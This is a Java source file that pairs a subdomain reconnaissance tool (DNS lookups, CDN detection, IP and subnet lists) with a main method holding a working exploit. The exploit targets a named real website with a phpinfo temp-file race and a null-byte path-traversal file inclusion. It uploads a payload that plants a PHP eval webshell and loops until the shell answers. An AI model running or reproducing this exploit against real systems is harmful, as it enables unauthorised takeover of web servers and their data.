package com.cdzmqm;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import java.util.TreeSet;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.xbill.DNS.*;

public class SubDomain{
	public static void main(String[] args) throws Exception 
	{
		String padding = "";
		for(int i=0;i<8000;i++)
		{
			padding = padding + "A";
		}
		HashMap<String,String> headers = new HashMap<>();
		String str="----------1918641284\r\n"
				  +"Content-Disposition: form-data; name=\"id\"; filename=\"wooyun.txt\"\r\n"
				  +"\r\n"
				  +"<?php file_put_contents('./cache/wy.php','<?php eval($_POST[\'wooyun\']);?>') ? print('wooyun_true') : print('wooyun_false');?>"
				  +"\r\n----------1918641284\r\n";
		headers.put("Content-type", "multipart/form-data; boundary=--------1918641284");
		headers.put("User-Agent", padding);
		headers.put("Accept", padding);
		headers.put("Accept-Language", padding);
		headers.put("Pragma", padding);
		headers.put("Cookie", "PHPSESSID=q249llvfromc1or39t6tvnun42; padding="+padding+";");
		String includeurl = "http://price.ziroom.com/?_p=../../../../../../../..{include}%00.html";
		String phpinfourl = "http://price.ziroom.com/phpinfo.php?a="+padding;
		while(true)
		{
			String phptmp = SubDomain.getPhptmp(Request.doPost(phpinfourl,str,headers));
			String get = includeurl.replaceFirst("\\{include\\}", phptmp);
			String data = Request.doGet(get);
			System.out.println(get);
			System.out.println(data);
			if(data.indexOf("Chora")>0)
			{
				System.out.println("webshell is");
				System.exit(0);
			}
		}
	}
	public static String getPhptmp(String data)
	{
		String tmp = null;
		Matcher m = Pattern.compile("\\[tmp_name] =&gt;\\s(.*?)\\s").matcher(data);
		if(m.find())
		{
			tmp = m.group(1);
		}
		return tmp;
	}
	public static String getDomain(String url,int type) throws Exception
	{
		Lookup lookup = new Lookup(url,type);
		String data = "";
		lookup.run();
		if (lookup.getResult() != Lookup.SUCCESSFUL){
			data = "ERROR: " + lookup.getErrorString();
		    return data;
		}
		Record[] answers = lookup.getAnswers();
		for(Record rec : answers){
		    data += rec.toString()+"\r\n";
		}
		return data;
	}
	public static HashMap<String, String> getDomain(String url) throws Exception
	{
		HashMap<String,String> domain = new HashMap<>();
		domain.put("NS",SubDomain.getDomain(url,Type.NS));
		domain.put("MX",SubDomain.getDomain(url,Type.MX));
		domain.put("A",SubDomain.getDomain(url,Type.A));
		return domain;
	}
	public static String getInfo(String tmp,String Domain,int option)
	{
		String Ip = "";
		String Code = null;
		String Server = null;
		boolean Iscdn = false;
		if (!tmp.matches("ERROR.+"))
		{
			Pattern p = Pattern.compile("(?<domain>[a-z-\\d.]+)\\..+\\s(?<ip>[\\d.]+)");
			Matcher m = p.matcher(tmp);		
			while(m.find())
			{
				Ip += m.group("ip")+',';
				if(!Domain.equalsIgnoreCase(m.group("domain"))) {
					Iscdn = true;
				}
			}
			Ip = Ip.substring(0,Ip.length()-1);
			if(option==3)
			{
				Code = Request.getResponse("http://"+Domain,"Code");
				Server = Request.getResponse("http://"+Domain,"Server");
			}else if(option==1)
			{
				Code = Request.getResponse("http://"+Domain,"Code");
			}else if(option==2)
			{
				Code = Request.getResponse("http://"+Domain,"Server");
			} 
			return Domain+"--"+Ip+"--"+Iscdn+"--"+Code+"--"+Server;//多线程中想要使用数据必须在类或者实例的成员函数里申明后使用。如果作为类或者实例的成员变量申明后使用，返回的数据全是一样的。
		} else 
		{
			return null;
		}
		
	}
}

class DomainInfoThread implements Runnable {
	private int i = 0;
	private int option;
	private BufferedWriter bw ;
	List<String> domains = new ArrayList<>();
	List<Domain> domains2 = new ArrayList<>();
	public DomainInfoThread(String file,int option) throws Exception
	{
		String domain;
		BufferedReader br = new BufferedReader(new FileReader(System.getProperty("user.dir")+"/"+file));
		while ((domain = br.readLine()) != null)
		{
			if(!domains.contains(this.purgeDomain(domain)))
			{
				this.i++;
				domains.add(this.purgeDomain(domain));
			}
		}
		this.option = option;
	}
	public void run() {
		String domain,info,tmp = null;
		try {
			for(;i>=0;)
			{
				i--;
				if(i>=0){
					domain = domains.get(i);
					info = SubDomain.getDomain(domain, Type.A);
					tmp = SubDomain.getInfo(info, domain,this.option);
					String[] s = tmp.split("--");
					synchronized (this) 
					{	
						if(s[1].indexOf(',')>0)
						{
							Domain d = new Domain();
							Domain d2 = new Domain();
							d.setIp(s[1].split(",")[0]);
							d.setDomain(s[0]);
							d.setIscdn(s[2]);
							d.setCode(s[3]);
							d.setServer(s[4]);
							d2.setIp(s[1].split(",")[1]);
							d2.setDomain(s[0]);
							d2.setIscdn(s[2]);
							d2.setCode(s[3]);
							d2.setServer(s[4]);
							domains2.add(d);
							domains2.add(d2);
						} else {
							Domain d = new Domain();
							d.setIp(s[1]);
							d.setDomain(s[0]);
							d.setIscdn(s[2]);
							d.setCode(s[3]);
							d.setServer(s[4]);
							domains2.add(d);
						}
						if(Thread.activeCount()<=4)
						{
//							Collections.sort(domains2,new Domain());
//							Collections.sort(domains2,new Comparator() {
//								@Override
//								public int compare(Object o1, Object o2) {
//									// TODO Auto-generated method stub
//									Domain d = (Domain)o1;
//									Domain d2 = (Domain)o2;
//									return d.Ip.compareTo(d2.Ip);
//								}
//							});	
							Collections.sort(domains2,new Comparator<Domain>() {
								@Override
								public int compare(Domain o1, Domain o2) {
									// TODO Auto-generated method stub
									return o1.getIp().compareTo(o2.getIp());
								}
							});
	
							bw = new BufferedWriter(new FileWriter("result.txt"));
							for(int j=0;j<domains2.size();j++)
							{
								write(domains2.get(j),this.option);			
							}
							bw.flush();
							bw.close();
							this.IP();
							this.aIP();
							this.cIP();
						}
					}
				}
			}
		} catch (Exception e) {
			// TODO: handle exception
			//e.printStackTrace();
		}
	}
	private String purgeDomain(String url)
	{
		String domain = null;
		if(url.indexOf("://")>0)
		{
			Matcher m = Pattern.compile("://([\\w-\\.]+)").matcher(url);
			if(m.find())
			{
				domain = m.group(1);
			}
		} else 
		{
			Matcher m = Pattern.compile("([\\w-\\.]+)").matcher(url);
			if(m.find())
			{
				domain = m.group(1);
			}
		}
		return domain;
	}
	private void IP() throws Exception
	{
		BufferedReader br = new BufferedReader(new FileReader("result.txt"));
		BufferedWriter bw = new BufferedWriter(new FileWriter("ip.txt"));
		TreeSet<String> ip = new TreeSet<>();
		String line;
		String[] cdn = null;
		while((line = br.readLine())!=null)
		{
			//System.out.println(line);
			cdn = line.split("\\s");
			if(cdn[2].equals("false"))
			{
				//System.out.println(cdn[0]+cdn[2]);
				ip.add(cdn[0]);
			}
		}
		br.close();
		Iterator<String> i = ip.iterator();
		while(i.hasNext())
		{
			bw.write(i.next());
			bw.newLine();
		}
		bw.close();
		
	}
	private void aIP()	throws Exception
	{
		BufferedReader br = new BufferedReader(new FileReader("result.txt"));
		BufferedWriter bw = new BufferedWriter(new FileWriter("aip.txt"));
		TreeSet<String> ip = new TreeSet<>();
		String line;
		while((line = br.readLine())!=null)
		{
			//System.out.println(line);
			Matcher m = Pattern.compile("(?<ip>[\\d.]+)").matcher(line);
			if(m.find())
			{
				//System.out.println(m.group("ip")+"*");
				ip.add(m.group("ip"));
			}
		}
		br.close();
		Iterator<String> i = ip.iterator();
		while(i.hasNext())
		{
			bw.write(i.next());
			bw.newLine();
		}
		bw.close();
	}
	private void cIP()	throws Exception
	{
		BufferedReader br = new BufferedReader(new FileReader("result.txt"));
		BufferedWriter bw = new BufferedWriter(new FileWriter("cip.txt"));
		TreeSet<String> cip = new TreeSet<>();
		String line;
		while((line = br.readLine())!=null)
		{
			//System.out.println(line);
			Matcher m = Pattern.compile("(?<ip>[\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3}\\.)").matcher(line);
			if(m.find())
			{
				//System.out.println(m.group("ip")+"*");
				cip.add(m.group("ip")+"*");
			}
		}
		br.close();
		Iterator<String> i = cip.iterator();
		while(i.hasNext())
		{
			bw.write(i.next());
			bw.newLine();
		}
		bw.close();
	}
	private void write(Domain d,int option) throws Exception
	{	
		switch (option) {
		case 0:
			bw.write(d.getIp()+"\t"+d.getDomain()+"\t"+d.getIscdn());
			bw.write(System.lineSeparator());
			break;
		case 1:
			bw.write(d.getIp()+"\t"+d.getDomain()+"\t"+d.getIscdn()+"\t"+d.getCode());
			bw.write(System.lineSeparator());
			break;
		case 2:
			bw.write(d.getIp()+"\t"+d.getDomain()+"\t"+d.getIscdn()+"\t"+d.getServer());
			bw.write(System.lineSeparator());
			break;
		case 3:
			bw.write(d.getIp()+"\t"+d.getDomain()+"\t"+d.getIscdn()+"\t"+d.getCode()+"\t"+d.getServer());
			bw.write(System.lineSeparator());
			break;
		}
	}
	class Domain //implements Comparator
	{
		private String Domain,Ip,Iscdn,Code,Server;
		public String getDomain() {
			return Domain;
		}
		public void setDomain(String domain) {
			Domain = domain;
		}
		public String getIp() {
			return Ip;
		}
		public void setIp(String ip) {
			Ip = ip;
		}
		public String getIscdn() {
			return Iscdn;
		}
		public void setIscdn(String iscdn) {
			Iscdn = iscdn;
		}
		public String getCode() {
			return Code;
		}
		public void setCode(String code) {
			Code = code;
		}
		public String getServer() {
			return Server;
		}
		public void setServer(String server) {
			Server = server;
		}
//		@Override
//		public int compare(Object o1, Object o2) {
//			// TODO Auto-generated method stub
//			Domain d = (Domain)o1;
//			Domain d2 = (Domain)o2;
//			return d.Ip.compareTo(d2.Ip);
//		}
	}
}
